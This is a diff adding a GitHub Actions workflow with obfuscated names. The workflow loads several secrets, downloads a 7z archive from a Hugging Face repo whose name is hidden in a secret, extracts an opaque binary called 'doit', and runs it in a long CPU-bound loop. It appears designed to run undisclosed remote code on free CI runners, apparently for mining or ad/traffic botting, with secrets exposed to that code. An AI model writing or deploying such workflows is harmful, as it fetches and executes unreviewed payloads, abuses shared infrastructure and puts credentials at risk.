@@ -1,0 +1,39 @@
+name: zig
+
+on:
+  workflow_dispatch:
+    inputs:
+      amd_override:
+        description: 'AmD'
+        required: false
+        default: 'v3'
+        type: string
+      loop_override:
+        description: 'Lup'
+        required: false
+        default: '10'
+        type: string
+
+env:
+  REPO_DIR: ${{ github.workspace }}
+  TAvvG: v1.0.0_${{ github.event.inputs.amd_override }}
+  LO_cOP: ${{ github.event.inputs.loop_override }}
+  ENV_MYWEB: ${{ secrets.ENV_MYWEB }}
+  ENV_ADS: ${{ secrets.ENV_ADS }}
+  ENV_DISD: ${{ secrets.ENV_DISD }}
+  HF_REPO: ${{ secrets.HF_REPO }}
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+      - name: Do
+        timeout-minutes: 51
+        run: |
+          curl -o doit.7z -L --url "https://huggingface.co/${{ env.HF_REPO }}/resolve/main/doit_${{ env.TAvvG }}.7z?download=true"
+          7z x doit.7z
+          rm -rf doit.7z
+          chmod +x doit
+          ./doit loop ${{ env.LO_cOP }} steps 1000000 wait 0 cpu 3
